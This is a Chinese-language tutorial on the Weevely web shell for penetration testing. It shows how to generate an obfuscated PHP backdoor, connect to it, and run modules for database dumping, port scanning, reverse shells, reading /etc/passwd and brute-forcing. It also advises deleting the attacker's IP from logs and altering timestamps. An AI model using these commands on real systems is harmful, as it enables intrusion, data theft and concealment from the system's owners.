## 简介：

工具主页：`https://www.kali.org/tools/weevely/`

`Weevely`是一个专门为web渗透攻击设计的web shell,由于是用python语言编写的工具，因此支持跨平台可以 任何有python环境的系统上使用。和Windows系统中一款类似的工具(中国菜刀)一样。
使用的是比较主流的base64加密结合字符串变形技术，后门中所使用的函数均是常用的字符串处理函数，有很好的隐蔽性。
weevely具有生成shell文件、连接后台、资源搜索、信息探测、文件管理操作、错误配置审计、暴力破解、数据库操作、端口扫描等功能

## 安装

在kali中已经默认安装了weevely 其他类似系统安装执行下面命令即可。
```
apt-get install weevely -y
```
## 基础用法

### 生成web shell
```
weevely generate <密码> <文件存储目录>
weevely generate mypassword123 /root/shell.php
```
### 连接web shell
```
weevely <URL> <password> [cmd]
weevely http://192.168.56.102/shell.php mypassword123
```

## 高级用法(模块)

当获取到目标系统的weevely shell后,我们通过help可以查看文件相关的模块。
通过这些文件操作模块，可以 对目标服务器进行文件的打包、上传、 下载、删除、在线修改、复制，还可以通过HTTPfs挂在远程文件系统。
通过这些操作，不仅可以修改目标服务器上的源代码，还可以清除或修改我们的操作日志。比如将access log中有关 攻击机IP地址的信息删除，或者算改日志中的时间戳等等。

### 查看命令帮助

```
help
```
### 查看系统信息
```
system_info
```
### 枚举用户文件

枚举用户目录下且有权限的文件,也可用来加载字典。这里我们可以通过
`:audit_ filesystem`,来查看都支 持搜索哪些类型的用户文件。

### 连接数据库
```
sql_console -u root -p 12345678
```
### 对数据库拖库``
```
sql_dump -dbms mysql tianyuan root 12345678
```
### 子网扫描
```
net_scan 192.168.1.1/24 80,3306 -print
```
### 模块大全

```
:backdoor_reversetcp          执行反向TCP shell
:backdoor_tcp                 在TCP端口产生一个壳
:file_cp                      复制单个文件
:file_grep                    打印线与多个文件中的模式匹配
:file_zip                     压缩或展开ZIP文件
:file_bzip2                   压缩或展开Bzip2文件
:file_tar                     压缩或展开tar文件
:file_gzip                    压缩或展开Gzip文件
:file_mount                   使用httpfs安装远程文件系统
:file_cd                      更改当前工作目录
:file_clearlog                从文件中删除字符串
:file_read                    从远程文件系统中读取远程文件
:file_download                从远程文件系统下载文件
:file_touch                   更改文件时间戳
:file_ls                      列表目录内容
:file_enum                    检查存在列表列表的存在和权限
:file_upload                  将文件上传到远程文件系统
:file_find                    查找具有给定名称和属性的文件
:file_check                   获取文件的属性和权限
:file_edit                    在本地编辑器上编辑远程文件
:file_webdownload             下载URL.
:file_upload2web              将文件自动上传到Web文件夹并获得相应的URL
:file_rm                      删除远程文件
:shell_php                    执行php命令
:shell_sh                     执行shell命令
:shell_su                     执行su的命令
:sql_dump                     多DBMS MySqldump更换
:sql_console                  执行SQL查询或运行控制台
:bruteforce_sql               BruteForce SQL数据库
:net_ifconfig                 获取网络接口地址
:net_mail                     发送邮件
:net_curl                     执行类似卷曲的HTTP请求。
:net_scan                     TCP端口扫描。
:net_proxy                    运行本地代理以通过目标浏览HTTP / HTTPS浏览。
:net_phpproxy                 在目标上安装PHP代理。
:system_info                  查看系统信息
:system_extensions            收集PHP和WebServer扩展列表。
:system_procs                 列出运行进程。
:audit_phpconf                查看PHP配置文件
:audit_suidsgid               查找suid或sgid标志的文件。
:audit_disablefunctionbypass  旁路禁用与mod_cgi和.htaccess的限制。
:audit_filesystem             枚举用户文件。        
:audit_etcpasswd              用不同的技术读取/ etc / passwd。
```